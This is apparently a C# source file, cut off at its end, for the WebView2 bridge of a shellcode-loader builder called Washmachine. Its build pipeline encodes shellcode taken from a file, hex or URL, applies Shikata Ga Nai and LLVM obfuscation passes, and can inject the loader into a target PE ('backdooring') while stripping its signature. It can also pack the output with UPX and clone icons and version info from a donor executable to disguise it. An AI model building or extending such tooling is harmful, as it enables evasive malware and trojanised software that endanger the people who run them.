using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.UI.Dispatching;
using Microsoft.Web.WebView2.Core;
using Washmachine.Logging;
using Washmachine.Models;
using Washmachine.Services;
using Washmachine.Views;
using Windows.Storage.Pickers;
using WinRT.Interop;

namespace Washmachine.Services;

/// <summary>
/// Owns the JS ↔ C# RPC channel for the WebView2-hosted UI.
///
/// Wire protocol (JSON, one message per call):
///   JS → C#  : { id: <int>, method: <string>, args: <object> }
///   C# → JS  : { id: <int>, result: <object> }      // success
///              { id: <int>, error: <string> }       // failure
///   C# → JS (push): { event: <string>, payload: <object> }
///
/// Methods are resolved by name from a static dispatch table; add a new
/// entry to <see cref="Methods"/> to expose more backend operations.
/// </summary>
public sealed class WebShellBridge
{
    private readonly CoreWebView2 _core;
    private readonly DispatcherQueue _ui;
    private readonly AppPaths _paths;
    private readonly CliExecutor _cli;
    private readonly WebShellWindow? _host;
    private readonly Dictionary<string, Func<JsonElement, Task<object?>>> _methods;
    private readonly DiagnosticsLogger _logger = new();

    private CancellationTokenSource? _buildCts;

    private static readonly JsonSerializerOptions JsonOpts = new()
    {
        PropertyNamingPolicy = JsonNamingPolicy.CamelCase,
        DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull,
    };

    public WebShellBridge(CoreWebView2 core, WebShellWindow? host = null)
    {
        _core = core ?? throw new ArgumentNullException(nameof(core));
        _ui = DispatcherQueue.GetForCurrentThread();
        _paths = new AppPaths();
        _cli = new CliExecutor();
        _host = host;

        _methods = new(StringComparer.OrdinalIgnoreCase)
        {
            ["ping"]                = Method_Ping,
            ["build"]               = Method_Build,
            ["stop"]                = Method_Stop,
            ["dry-run"]             = Method_DryRun,
            ["browse-file"]         = Method_BrowseFile,
            ["browse-folder"]       = Method_BrowseFolder,
            ["read-text"]           = Method_ReadText,
            ["app-info"]            = Method_AppInfo,
            ["list-playbooks"]      = Method_ListPlaybooks,
            ["catalog-encoders"]    = Method_CatalogEncoders,
            ["catalog-envelopes"]   = Method_CatalogEnvelopes,
            ["catalog-compilers"]   = Method_CatalogCompilers,
            ["catalog-llvm-passes"] = Method_CatalogLlvmPasses,
            ["catalog-snippets"]    = Method_CatalogSnippets,
            ["detect-upx"]          = Method_DetectUpx,
            ["analyze-shellcode"]   = Method_AnalyzeShellcode,
            ["analyze-pe"]          = Method_AnalyzePe,
            ["history-list"]        = Method_HistoryList,
            ["history-delete"]      = Method_HistoryDelete,
            ["history-clear"]       = Method_HistoryClear,
            ["reveal-file"]         = Method_RevealFile,
            ["open-file"]           = Method_OpenFile,
            ["set-playbook"]        = Method_SetPlaybook,
            ["window-minimize"]     = Method_WindowMinimize,
            ["window-maximize"]     = Method_WindowMaximize,
            ["window-close"]        = Method_WindowClose,
        };

        _core.WebMessageReceived += OnWebMessageReceived;
    }

    private void OnWebMessageReceived(CoreWebView2 sender, CoreWebView2WebMessageReceivedEventArgs args)
    {
        string raw = args.TryGetWebMessageAsString();
        _ = HandleAsync(raw);
    }

    private async Task HandleAsync(string raw)
    {
        int id = 0;
        try
        {
            using var doc = JsonDocument.Parse(raw);
            var root = doc.RootElement;
            id = root.TryGetProperty("id", out var idEl) ? idEl.GetInt32() : 0;
            string method = root.TryGetProperty("method", out var mEl) ? (mEl.GetString() ?? string.Empty) : string.Empty;
            JsonElement argsEl = root.TryGetProperty("args", out var aEl) ? aEl : default;

            if (!_methods.TryGetValue(method, out var handler))
                throw new InvalidOperationException($"Unknown method: {method}");

            var result = await handler(argsEl);
            await PostResultAsync(id, result);
        }
        catch (Exception ex)
        {
            await PostErrorAsync(id, ex.Message);
        }
    }

    /// <summary>Push a server-initiated event to JS (build progress, log lines, etc.).</summary>
    public void PushEvent(string eventName, object? payload = null)
    {
        var msg = new { @event = eventName, payload };
        var json = JsonSerializer.Serialize(msg, JsonOpts);
        // Marshall to UI thread before talking to WebView2
        _ui.TryEnqueue(() =>
        {
            try { _core.PostWebMessageAsJson(json); }
            catch { /* WebView torn down */ }
        });
    }

    private Task PostResultAsync(int id, object? result)
    {
        var json = JsonSerializer.Serialize(new { id, result }, JsonOpts);
        _ui.TryEnqueue(() =>
        {
            try { _core.PostWebMessageAsJson(json); }
            catch { /* WebView torn down */ }
        });
        return Task.CompletedTask;
    }

    private Task PostErrorAsync(int id, string error)
    {
        var json = JsonSerializer.Serialize(new { id, error }, JsonOpts);
        _ui.TryEnqueue(() =>
        {
            try { _core.PostWebMessageAsJson(json); }
            catch { /* WebView torn down */ }
        });
        return Task.CompletedTask;
    }

    // ── Method handlers ────────────────────────────────────────────

    private Task<object?> Method_Ping(JsonElement _) =>
        Task.FromResult<object?>(new { ok = true, ts = DateTimeOffset.UtcNow });

    private async Task<object?> Method_Build(JsonElement args)
    {
        if (!_cli.IsAvailable)
            return new { ok = false, message = "CLI not built — run dotnet build Washmachine.Cli." };

        // Cancel any previous build
        var prevCts = _buildCts;
        prevCts?.Cancel();

        _buildCts = new CancellationTokenSource();
        var ct = _buildCts.Token;

        var cliArgs = new List<string> { "encode" };

        // Source
        string sourceKind = GetStr(args, "sourceKind", "file");
        switch (sourceKind)
        {
            case "raw":
                string hex = GetStr(args, "shellcodeRawInput", "").Replace(" ", "");
                if (string.IsNullOrWhiteSpace(hex))
                    return new { ok = false, message = "No shellcode hex provided." };
                cliArgs.Add("-ShellcodeHex"); cliArgs.Add(hex);
                break;
            case "url":
                string url = GetStr(args, "shellcodeUrlValue", "");
                if (string.IsNullOrWhiteSpace(url))
                    return new { ok = false, message = "No shellcode URL provided." };
                cliArgs.Add("-ShellcodeUrl"); cliArgs.Add(url);
                break;
            default: // file
                string filePath = GetStr(args, "shellcodeFileInput", "");
                if (string.IsNullOrWhiteSpace(filePath))
                    return new { ok = false, message = "No shellcode file path provided." };
                cliArgs.Add("-Shellcode"); cliArgs.Add(filePath);
                break;
        }

        // Template
        string template = GetStr(args, "templateCombo", "");
        if (!string.IsNullOrWhiteSpace(template)) { cliArgs.Add("-Template"); cliArgs.Add(template); }

        // Encoder / Envelope
        string encoder = GetStr(args, "encoderCombo", "");
        if (!string.IsNullOrWhiteSpace(encoder)) { cliArgs.Add("-Encoder"); cliArgs.Add(encoder); }

        string envelope = GetStr(args, "envelopeCombo", "");
        if (!string.IsNullOrWhiteSpace(envelope)) { cliArgs.Add("-Envelope"); cliArgs.Add(envelope); }

        // SGN
        if (GetStr(args, "shikataGaNaiEnabledCheckBox", "False").Equals("True", StringComparison.OrdinalIgnoreCase))
        {
            cliArgs.Add("-Sgn");
            string sgnCount = GetStr(args, "shikataGaNaiEncodeCountInput", "1");
            cliArgs.Add("-SgnCount"); cliArgs.Add(sgnCount);
            string sgnMax = GetStr(args, "shikataGaNaiMaxBytesInput", "50");
            cliArgs.Add("-SgnMax"); cliArgs.Add(sgnMax);
            string sgnPlacement = GetStr(args, "shikataGaNaiPlacement", "pre");
            cliArgs.Add("-SgnPlacement"); cliArgs.Add(sgnPlacement);
        }

        // Snippets: { sectionTemplate: [itemId, ...] | "itemId" }
        if (args.ValueKind == JsonValueKind.Object && args.TryGetProperty("snippetSelections", out var snipSel)
            && snipSel.ValueKind == JsonValueKind.Object)
        {
            foreach (var prop in snipSel.EnumerateObject())
            {
                List<string> ids = new();
                if (prop.Value.ValueKind == JsonValueKind.Array)
                {
                    foreach (var el in prop.Value.EnumerateArray())
                    {
                        var s = el.GetString();
                        if (!string.IsNullOrWhiteSpace(s)) ids.Add(s);
                    }
                }
                else if (prop.Value.ValueKind == JsonValueKind.String)
                {
                    var s = prop.Value.GetString();
                    if (!string.IsNullOrWhiteSpace(s)) ids.Add(s);
                }
                if (ids.Count > 0)
                {
                    cliArgs.Add("-Snippet");
                    cliArgs.Add($"{prop.Name}={string.Join(",", ids)}");
                }
            }
        }

        // Text inputs: { "section.item.input": "value" }
        if (args.ValueKind == JsonValueKind.Object && args.TryGetProperty("snippetInputs", out var textInps)
            && textInps.ValueKind == JsonValueKind.Object)
        {
            var pairs = new List<string>();
            foreach (var prop in textInps.EnumerateObject())
            {
                string v = prop.Value.GetString() ?? "";
                if (!string.IsNullOrWhiteSpace(prop.Name) && !string.IsNullOrWhiteSpace(v))
                    pairs.Add($"{prop.Name}={v}");
            }
            if (pairs.Count > 0) { cliArgs.Add("-Text"); cliArgs.Add(string.Join(";", pairs)); }
        }

        // Packing and finalization are applied to the final artifact below. Keeping
        // them out of the encode command preserves the documented pipeline order,
        // especially when a backdoor target replaces the freshly compiled loader.

        // Compilation backend
        string backend = GetStr(args, "compilationBackend", "Deterministic");
        if (backend.Equals("LlvmObfuscated", StringComparison.OrdinalIgnoreCase))
        {
            cliArgs.Add("-Backend"); cliArgs.Add("LlvmObfuscated");
            var passes = GetStrArr(args, "llvmObfuscationPasses");
            foreach (var pass in passes)
            {
                cliArgs.Add("-LlvmPass");
                cliArgs.Add(pass);
            }
        }

        // Verbose
        if (GetStr(args, "VerboseBuildCheck", "False").Equals("True", StringComparison.OrdinalIgnoreCase))
            cliArgs.Add("-Verbose");

        // Machine-readable output so we can parse results
        cliArgs.Add("-Json");

        PushEvent("build-started", new { startedAt = DateTimeOffset.UtcNow });
        PushEvent("build-log", new { line = "[stage:src] done" });
        PushEvent("build-log", new { line = GetBool(args, "shikataGaNaiEnabledCheckBox") ? "[stage:sgn] running" : "[stage:sgn] done" });
        PushEvent("build-log", new { line = "[stage:enc] running" });

        bool openAfter = GetStr(args, "OpenFolderAfterCompile", "True")
            .Equals("True", StringComparison.OrdinalIgnoreCase);

        try
        {
            var result = await _cli.RunAsync(cliArgs, line => PushEvent("build-log", new { line }), ct);

            string? outputPath = ParseOutputPath(result.OutputLines);
            if (result.Success)
            {
                PushEvent("build-log", new { line = "[stage:sgn] done" });
                PushEvent("build-log", new { line = "[stage:enc] done" });
                PushEvent("build-log", new { line = "[stage:tpl] done" });
                PushEvent("build-log", new { line = "[stage:cmp] done" });

                if (string.IsNullOrWhiteSpace(outputPath) || !File.Exists(outputPath))
                    throw new InvalidOperationException("The compiler completed but did not report an output executable.");

                outputPath = await ApplyRemainingStagesAsync(args, outputPath, ct);
            }

            string? buildError = result.Success
                ? null
                : result.OutputLines.LastOrDefault(line => !string.IsNullOrWhiteSpace(line))
                  ?? "The CLI build failed without an error message.";
            if (!result.Success)
                PushEvent("build-log", new { line = $"[stage:cmp] err {buildError}" });
            PushEvent("build-finished", new { ok = result.Success, success = result.Success, exitCode = result.ExitCode, outputPath, error = buildError });
            if (result.Success && openAfter && !string.IsNullOrWhiteSpace(outputPath))
                System.Diagnostics.Process.Start("explorer.exe", $"/select,\"{outputPath}\"");
            return new { ok = result.Success, exitCode = result.ExitCode, outputPath, error = buildError, message = buildError };
        }
        catch (OperationCanceledException)
        {
            PushEvent("build-finished", new { ok = false, success = false, cancelled = true, exitCode = -1 });
            return new { ok = false, cancelled = true };
        }
        catch (Exception ex)
        {
            PushEvent("build-log", new { line = $"[stage:cmp] err {ex.Message}" });
            PushEvent("build-finished", new { ok = false, success = false, error = ex.Message, exitCode = -1 });
            return new { ok = false, message = ex.Message, error = ex.Message, exitCode = -1 };
        }
        finally
        {
            _buildCts = null;
        }
    }

    private async Task<string> ApplyRemainingStagesAsync(JsonElement args, string compiledOutput, CancellationToken ct)
    {
        string outputPath = compiledOutput;

        if (GetBool(args, "EnableBackdooringToggle"))
        {
            PushEvent("build-log", new { line = "[stage:bd] running" });
            string targetPath = GetStr(args, "TargetPePath", "");
            if (!File.Exists(targetPath))
                throw new FileNotFoundException("Backdoor target not found.", targetPath);

            string payloadPath = Path.Combine(
                Path.GetDirectoryName(compiledOutput)!,
                Path.GetFileNameWithoutExtension(compiledOutput) + ".payload.bin");
            var strip = await _cli.RunAsync(
                ["strip", compiledOutput, "-Output", payloadPath, "-Mode", "ep"],
                line => PushEvent("build-log", new { line }),
                ct);
            if (!strip.Success || !File.Exists(payloadPath))
                throw new InvalidOperationException("Could not extract the compiled loader for PE injection.");

            string extension = Path.GetExtension(targetPath);
            string patchedPath = Path.Combine(
                Path.GetDirectoryName(targetPath)!,
                Path.GetFileNameWithoutExtension(targetPath) + ".backdoored" + extension);
            var backdoorArgs = new List<string>
            {
                "backdoor",
                "-Pe", targetPath,
                "-Shellcode", payloadPath,
                "-Output", patchedPath,
                "-Method", GetStr(args, "InjectionMethodCombo", "code-cave"),
                "-Carrier", GetStr(args, "CarrierInvokeCombo", "entry-point"),
                "-SectionName", GetStr(args, "SectionNameInput", ".extra"),
                "-CaveMinSize", GetStr(args, "CaveMinSizeBox", "64"),
                "-Json",
            };
            if (!GetBool(args, "PreserveEntryCheck", true)) backdoorArgs.Add("-NoPreserveEntry");
            if (!GetBool(args, "PatchIatCheck", true)) backdoorArgs.Add("-NoPatchIat");
            if (!GetBool(args, "RemoveSignatureCheck", true)) backdoorArgs.Add("-NoRemoveSig");
            if (!GetBool(args, "PatchSubsystemCheck", true)) backdoorArgs.Add("-NoPatchSubsystem");
            if (!GetBool(args, "PatchExitCheck", true)) backdoorArgs.Add("-NoPatchExit");

            try
            {
                var backdoor = await _cli.RunAsync(
                    backdoorArgs,
                    line => PushEvent("build-log", new { line }),
                    ct);
                if (!backdoor.Success)
                    throw new InvalidOperationException("PE injection failed. See the build log for details.");
                outputPath = ParseOutputPath(backdoor.OutputLines) ?? patchedPath;
                if (!File.Exists(outputPath))
                    throw new FileNotFoundException("PE injection did not create the expected artifact.", outputPath);
            }
            finally
            {
                try { if (File.Exists(payloadPath)) File.Delete(payloadPath); } catch { }
            }
            PushEvent("build-log", new { line = "[stage:bd] done" });
        }
        else
        {
            PushEvent("build-log", new { line = "[stage:bd] done" });
        }

        if (GetBool(args, "EnablePackingToggle"))
        {
            PushEvent("build-log", new { line = "[stage:pk] running" });
            string upxPath = GetStr(args, "UpxPathInput", "");
            if (!File.Exists(upxPath))
                upxPath = FindUpxExecutable() ?? string.Empty;
            if (!File.Exists(upxPath))
                throw new FileNotFoundException("UPX is enabled but upx.exe was not found.");

            var upxArgs = new List<string>();
            switch (GetStr(args, "UpxCompression", "best"))
            {
                case "best": upxArgs.Add("--best"); break;
                case "ultra": upxArgs.Add("--ultra-brute"); break;
            }
            if (GetBool(args, "UpxStripRelocs")) upxArgs.Add("--strip-relocs");
            if (GetBool(args, "UpxKeepBackup")) upxArgs.Add("-k");
            upxArgs.Add("--overlay=copy");
            upxArgs.Add(outputPath);

            var packed = await RunProcessAsync(upxPath, upxArgs, ct);
            foreach (var line in packed.OutputLines)
                PushEvent("build-log", new { line });
            if (packed.ExitCode != 0)
                throw new InvalidOperationException("UPX packing failed. See the build log for details.");
            PushEvent("build-log", new { line = "[stage:pk] done" });
        }
        else
        {
            PushEvent("build-log", new { line = "[stage:pk] done" });
        }

        if (GetBool(args, "EnableFinalizeToggle"))
        {
            PushEvent("build-log", new { line = "[stage:fn] running" });
            string donorPath = GetStr(args, "DonorPathInput", "");
            long.TryParse(GetStr(args, "NopPaddingInput", "0"), out long padding);
            var service = new PePostCompileService(_logger);
            var notes = service.Apply(outputPath, new PostCompileOptions(
                string.IsNullOrWhiteSpace(donorPath) ? null : donorPath,
                GetBool(args, "CloneRsrc", true),
                GetBool(args, "CloneIcon", true),
                GetBool(args, "CloneVersionInfo", true),
                Math.Max(0, padding)));
            foreach (var note in notes)
                PushEvent("build-log", new { line = note });
            PushEvent("build-log", new { line = "[stage:fn] done" });
        }
        else
        {
            PushEvent("build-log", new { line = "[stage:fn] done" });
        }

        return outputPath;
    }

    private Task<object?> Method_Stop(JsonElement _)
    {
        var cts = _buildCts;
        if (cts != null)
        {
            cts.Cancel();
            _buildCts = null;
        }
        PushEvent("build-stopped", new { at = DateTimeOffset.UtcNow });
        return Task.FromResult<object?>(new { ok = true });
    }

    private async Task<object?> Method_DryRun(JsonElement args)
    {
        if (!_cli.IsAvailable)
            return new { ok = false, message = "CLI not built." };

        var errors = new List<string>();
        string sourceKind = GetStr(args, "sourceKind", "file");
        if (sourceKind == "file" && !File.Exists(GetStr(args, "shellcodeFileInput", "")))
            errors.Add("Select an existing shellcode file.");
        else if (sourceKind == "raw")
        {
            string hex = GetStr(args, "shellcodeRawInput", "").Replace(" ", "");
            if (hex.Length == 0 || hex.Length % 2 != 0 || hex.Any(c => !Uri.IsHexDigit(c)))
                errors.Add("Raw shellcode must be an even-length hexadecimal value.");
        }
        else if (sourceKind == "url")
        {
            string url = GetStr(args, "shellcodeUrlValue", "");
            if (!Uri.TryCreate(url, UriKind.Absolute, out var uri) || uri.Scheme is not ("http" or "https"))
                errors.Add("Shellcode URL must be an absolute HTTP or HTTPS URL.");
        }

        try
        {
            var playbook = new PlaybookService(_paths);
            if (!playbook.TryGetTemplate(GetStr(args, "templateCombo", ""), out _))
                errors.Add("Select a template from the active playbook.");
        }
        catch (Exception ex)
        {
            errors.Add($"Playbook is unavailable: {ex.Message}");
        }

        if (GetBool(args, "EnableBackdooringToggle") && !File.Exists(GetStr(args, "TargetPePath", "")))
            errors.Add("Backdooring is enabled but the target PE does not exist.");
        if (GetBool(args, "EnablePackingToggle") &&
            !File.Exists(GetStr(args, "UpxPathInput", "")) && FindUpxExecutable() == null)
            errors.Add("Packing is enabled but UPX was not found.");
        if (GetBool(args, "EnableFinalizeToggle"))
        {
            string donor = GetStr(args, "DonorPathInput", "");
            if (!string.IsNullOrWhiteSpace(donor) && !File.Exists(donor))
                errors.Add("The finalize donor executable does not exist.");
            if (!long.TryParse(GetStr(args, "NopPaddingInput", "0"), out long padding) || padding < 0)
                errors.Add("NOP padding must be a non-negative integer.");
        }

        PushEvent("build-started", new { startedAt = DateTimeOffset.UtcNow, dryRun = true });
        PushEvent("build-log", new { line = "[dry-run] Validating recipe — no artifacts will be written." });
        foreach (var error in errors)
            PushEvent("build-log", new { line = $"[validation] {error}" });
        bool ok = errors.Count == 0;
        if (ok)
            PushEvent("build-log", new { line = "[validation] Recipe is operable with the installed components." });
        PushEvent("build-finished", new { ok, success = ok, dryRun = true, errors });
        await Task.CompletedTask;
        return new { ok, errors };
    }

    // ── Catalog endpoints ──────────────────────────────────────────

    private async Task<object?> Method_CatalogEncoders(JsonElement _)
    {
        try
        {
            var runner = new Bin2ShellRunner(_paths);
            var svc = new ShellcodeEncodingCatalogService(runner, _paths);
            var cat = await svc.GetCatalogAsync();
            var items = cat.Encoders.Select(e => new { index = e.Index, name = e.Name, description = e.Description }).ToArray();
            return new { ok = true, items };
        }
        catch (Exception ex)
        {
            return new { ok = false, message = ex.Message, items = Array.Empty<object>() };
        }
    }

    private async Task<object?> Method_CatalogEnvelopes(JsonElement _)
    {
        try
        {
            var runner = new Bin2ShellRunner(_paths);
            var svc = new ShellcodeEncodingCatalogService(runner, _paths);
            var cat = await svc.GetCatalogAsync();
            var items = cat.Envelopes.Select(e => new { index = e.Index, name = e.Name, description = e.Description }).ToArray();
            return new { ok = true, items };
        }
        catch (Exception ex)
        {
            return new { ok = false, message = ex.Message, items = Array.Empty<object>() };
        }
    }

    private async Task<object?> Method_CatalogCompilers(JsonElement _)
    {
        try
        {
            var locator = new CompilerToolLocator(_logger);
            var result = await locator.DiscoverAsync();
            var items = result.Candidates.Select((c, index) => new
            {
                index,
                path = c.Path,
                name = c.Kind.ToString(),
                kind = c.Kind,
                version = c.InstanceVersion ?? c.Edition,
                edition = c.Edition,
                year = c.Year,
                validated = c.Validated,
            }).ToArray();
            return new { ok = true, items, best = result.Best?.Path ?? "" };
        }
        catch (Exception ex)
        {
            return new { ok = false, message = ex.Message, items = Array.Empty<object>() };
        }
    }

    private Task<object?> Method_CatalogLlvmPasses(JsonElement _)
    {
        try
        {
            var registry = new LlvmPassRegistry(_paths, _logger);
            var items = registry.GetAllPasses().Select(p => new
            {
                id = p.Id,
                name = p.Name,
                description = p.Description,
                available = p.IsBuilt,
            }).ToArray();
            return Task.FromResult<object?>(new { ok = true, items });
        }
        catch (Exception ex)
        {
            return Task.FromResult<object?>(new { ok = false, message = ex.Message, items = Array.Empty<object>() });
        }
    }

    private Task<object?> Method_CatalogSnippets(JsonElement _)
    {
        try
        {
            var svc = new PlaybookService(_paths);
            var templates = svc.GetTemplates().Select(t => new
            {
                id = t.Id,
                display = t.Display,
                description = t.Description,
                placeholderCount = t.Placeholders.Count,
            }).ToArray();

            var sections = svc.GetAllSections()
                .Where(s => !string.Equals(s.Template, "shellcodeexecution", StringComparison.OrdinalIgnoreCase)
                         && !string.Equals(s.Template, "genericshellcode", StringComparison.OrdinalIgnoreCase))
                .Select(s => new
                {
                    header = s.Header,
                    template = s.Template,
                    name = s.Display,
                    display = s.Display,
                    allowMultiple = s.AllowMultiple,
                    inputs = s.Inputs.Select(inp => new
                    {
                        id = inp.Id,
                        label = inp.Label,
                        placeholder = inp.Placeholder,
                        defaultValue = inp.DefaultValue,
                    }).ToArray(),
                    items = s.Items
                        .Where(i => !string.IsNullOrWhiteSpace(i.Id)
                                 && !i.Id.Equals("None", StringComparison.OrdinalIgnoreCase)
                                 && !i.Display.Contains("Skip", StringComparison.OrdinalIgnoreCase))
                        .Select(i => new
                        {
                            id = i.Id,
                            display = i.Display,
                            isDefault = i.IsDefault,
                            hasTextInput = i.Inputs.Count > 0,
                            textInputLabel = i.Inputs.FirstOrDefault()?.Label,
                            textInputPlaceholder = i.Inputs.FirstOrDefault()?.Placeholder,
                            inputs = i.Inputs.Select(inp => new
                            {
                                id = inp.Id,
                                label = inp.Label,
                                placeholder = inp.Placeholder,
                                defaultValue = inp.DefaultValue,
                            }).ToArray(),
                        }).ToArray(),
                }).ToArray();

            return Task.FromResult<object?>(new { ok = true, templates, sections });
        }
        catch (Exception ex)
        {
            return Task.FromResult<object?>(new { ok = false, message = ex.Message, templates = Array.Empty<object>(), sections = Array.Empty<object>() });
        }
    }

    // ── Analysis endpoints ─────────────────────────────────────────

    private async Task<object?> Method_AnalyzeShellcode(JsonElement args)
    {
        if (!args.TryGetProperty("path", out var pEl) || pEl.GetString() is not string path || !File.Exists(path))
            return new { ok = false, message = "File not found." };

        var bytes = await File.ReadAllBytesAsync(path);

        string sha256;
        using (var sha = SHA256.Create())
            sha256 = Convert.ToHexString(sha.ComputeHash(bytes)).ToLowerInvariant();

        double entropy = ComputeEntropy(bytes);
        string arch = DetectShellcodeArch(bytes);
        string sizeText = FormatBytes(bytes.Length);
        string bytesPreview = FormatHexPreview(bytes, 64);

        return new { ok = true, size = bytes.Length, sizeText, entropy = Math.Round(entropy, 2), arch, sha256, bytesPreview };
    }

    private Task<object?> Method_AnalyzePe(JsonElement args) =>
        PeScanEndpoint.AnalyzeAsync(args, _logger);

    // ── History endpoints ──────────────────────────────────────────

    private Task<object?> Method_HistoryList(JsonElement _)
    {
        var entries = PayloadHistoryStore.LoadAll();
        var items = entries.Select(e => new
        {
            id = e.Id,
            timestamp = e.GeneratedAtUtc,
            displayTimestamp = e.DisplayTimestamp,
            sourceFile = e.SourceFileName,
            encoderIndex = e.EncoderIndex,
            encoderName = e.EncoderName,
            envelopeIndex = e.EnvelopeIndex,
            envelopeName = e.EnvelopeName,
            payloadLengthBytes = e.PayloadLengthBytes,
            date = e.DisplayTimestamp,
            templateId = e.TemplateName,
            sourceName = e.DisplaySourceName,
            outputSize = e.SourceSizeDisplay,
            status = e.SessionSuccess == true ? "ok" : e.SessionSuccess == false ? "err" : "warn",
            outputPath = e.SessionOutputPath,
            sessionDir = e.SessionDir,
            isSession = e.IsSessionEntry,
        }).ToArray();
        return Task.FromResult<object?>(new { ok = true, items, sessions = items });
    }

    private Task<object?> Method_HistoryDelete(JsonElement args)
    {
        if (!args.TryGetProperty("id", out var idEl)) throw new ArgumentException("id required");
        var id = idEl.GetString() ?? "";
        var entry = PayloadHistoryStore.LoadAll().FirstOrDefault(e =>
            string.Equals(e.Id, id, StringComparison.OrdinalIgnoreCase));
        bool deleted = entry?.IsSessionEntry == true && entry.SessionDir != null
            ? PayloadHistoryStore.DeleteSession(entry.SessionDir)
            : PayloadHistoryStore.Delete(id);
        return Task.FromResult<object?>(new { ok = deleted });
    }

    private Task<object?> Method_HistoryClear(JsonElement _)
    {
        PayloadHistoryStore.Clear();
        PayloadHistoryStore.ClearSessions();
        return Task.FromResult<object?>(new { ok = true });
    }

    private Task<object?> Method_DetectUpx(JsonElement _)
    {
        var path = FindUpxExecutable();
        return Task.FromResult<object?>(new { ok = path != null, path = path ?? string.Empty });
    }

    // ── Shell helper endpoints ─────────────────────────────────────

    private Task<object?> Method_RevealFile(JsonElement args)
    {
        if (!args.TryGetProperty("path", out var pEl)) throw new ArgumentException("path required");
        var path = pEl.GetString() ?? "";
        if (!string.IsNullOrWhiteSpace(path))
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "explorer.exe",
                    Arguments = File.Exists(path) ? $"/select,\"{path}\"" : $"\"{Path.GetDirectoryName(path)}\"",
                    UseShellExecute = true,
                });
            }
            catch { /* ignore */ }
        }
        return Task.FromResult<object?>(new { ok = true });
    }

    private Task<object?> Method_OpenFile(JsonElement args)
    {
        if (!args.TryGetProperty("path", out var pEl)) throw new ArgumentException("path required");
        var path = pEl.GetString() ?? "";
        if (!string.IsNullOrWhiteSpace(path) && File.Exists(path))
        {
            try { Process.Start(new ProcessStartInfo(path) { UseShellExecute = true }); }
            catch { /* ignore */ }
        }
        return Task.FromResult<object?>(new { ok = true });
    }

    private Task<object?> Method_SetPlaybook(JsonElement args)
    {
        if (!args.TryGetProperty("path", out var pEl)) throw new ArgumentException("path required");
        var path = pEl.GetString() ?? "";
        bool success = _paths.SetActivePlaybook(path);
        return Task.FromResult<object?>(new { ok = success, active = _paths.ActivePlaybookFullPath });
    }

    // ── Static helpers ─────────────────────────────────────────────

    private static bool GetBool(JsonElement el, string key, bool fallback = false)
    {
        string text = GetStr(el, key, fallback ? "True" : "False");
        return bool.TryParse(text, out bool value) ? value : fallback;
    }

    private static string? ParseOutputPath(IEnumerable<string> lines)
    {
        foreach (var line in lines.Reverse())
        {
            if (!line.TrimStart().StartsWith('{'))
                continue;
            try
            {
                using var doc = JsonDocument.Parse(line);
                if (doc.RootElement.TryGetProperty("outputPath", out var output) ||
                    doc.RootElement.TryGetProperty("OutputPath", out output))
                    return output.GetString();
            }
            catch (JsonException) { }
        }
        return null;
    }

    private static string? FindUpxExecutable()
    {
        string?[] candidates =
        [
            Path.Combine(AppContext.BaseDirectory, "Tools", "upx.exe"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "upx", "upx.exe"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "upx", "upx.exe"),
        ];
        var fromKnownLocation = candidates.FirstOrDefault(path =>
            !string.IsNullOrWhiteSpace(path) && File.Exists(path));
        if (fromKnownLocation != null)
            return fromKnownLocation;

        var pathValue = Environment.GetEnvironmentVariable("PATH");
        if (string.IsNullOrWhiteSpace(pathValue))
            return null;
        return pathValue.Split(Path.PathSeparator, StringSplitOptions.RemoveEmptyEntries)
            .Select(folder => Path.Combine(folder.Trim(), "upx.exe"))
            .FirstOrDefault(File.Exists);
    }

    private static async Task<CliResult> RunProcessAsync(
        string executable,
        IEnumerable<string> args,
        CancellationToken ct)
    {
        var startInfo = new ProcessStartInfo
        {
            FileName = executable,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true,
        };
        foreach (var arg in args)
            startInfo.ArgumentList.Add(arg);

        var lines = new List<string>();
        var sync = new object();
        using var process = Process.Start(startInfo)
            ?? throw new InvalidOperationException($"Failed to start '{executable}'.");
        process.OutputDataReceived += (_, e) =>
        {
            if (e.Data != null) lock (sync) lines.Add(e.Data);
        };
        process.ErrorDataReceived += (_, e) =>
        {
            if (e.Data != null) lock (sync) lines.Add(e.Data);
        };
        process.BeginOutputReadLine();
        process.BeginErrorReadLine();
        await process.WaitForExitAsync(ct);
        lock (sync)
            return new CliResult(process.ExitCode, lines.ToArray());
    }

    private static string GetStr(JsonElement el, string key, string fallback)
    {
        if (el.ValueKind != JsonValueKind.Object) return fallback;
        if (el.TryGetProperty(key, out var prop))
        {
            if (prop.ValueKind == JsonValueKind.String)
                return prop.GetString() ?? fallback;
            if (prop.ValueKind == JsonValueKind.True) return "True";
            if (prop.ValueKind == JsonValueKind.False) return "False";
            if (prop.ValueKind == JsonValueKind.Number) return prop.GetRawText();
        }
        return fallback;
    }

    private static string[] GetStrArr(JsonElement el, string key)
    {
        if (el.ValueKind != JsonValueKind.Object) return Array.Empty<string>();
        if (!el.TryGetProperty(key, out var prop)) return Array.Empty<string>();
        if (prop.ValueKind == JsonValueKind.Array)
            return prop.EnumerateArray().Select(x => x.GetString() ?? "")
                       .Where(s => !string.IsNullOrWhiteSpace(s)).ToArray();
        return Array.Empty<string>();
    }

    private static double ComputeEntropy(byte[] data)
    {
        if (data.Length == 0) return 0.0;
        var freq = new int[256];
        foreach (var b in data) freq[b]++;
        double e = 0.0, len = data.Length;
        foreach (var f in freq) { if (f == 0) continue; double p = f / len; e -= p * Math.Log2(p); }
        return e;
    }

    private static string DetectShellcodeArch(byte[] b)
    {
        if (b.Length < 2) return "unknown";
        // x64 msfvenom/CobaltStrike typical prelude: FC 48 ...
        if (b[0] == 0xFC && b[1] == 0x48) return "x86_64";
        // x86: FC E8 ...
        if (b[0] == 0xFC && b[1] == 0xE8) return "x86";
        // x64 REX prefix
        if (b.Length > 3 && b[0] == 0x48 && (b[1] == 0x83 || b[1] == 0x89)) return "x86_64";
        return "unknown";
    }

    private static string FormatBytes(long bytes)
    {
        if (bytes < 1024) return $"{bytes} B";
